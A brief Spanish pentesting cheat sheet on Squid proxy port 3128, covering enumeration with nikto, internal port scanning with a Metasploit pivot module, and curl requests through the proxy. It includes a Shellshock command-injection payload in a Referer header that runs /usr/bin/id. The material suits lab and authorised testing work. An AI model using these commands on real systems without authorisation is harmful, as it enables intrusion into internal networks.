3128 - Squid Proxy

Esquema Squid Proxy: Kali (Red 1) -> Squid (3128) (Red 1:Red 2) -> Servicios HTTP/FTP en Red 2.

Enumerar información sobre el proxy Squid

nikto -h <ip_target> -useproxy http://<ip_target>:<puerto_squid>

Metasploit: Escanear puertos internos

use auxiliary/scanner/http/squid_pivot_scanning

Lanzar consultas con curl

curl --proxy <ip>:<puerto> http://<ip>/cgi-bin/status 
# Shellshock
curl -v --proxy <ip>:<puerto> http://<ip>/cgi-bin/status -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit"
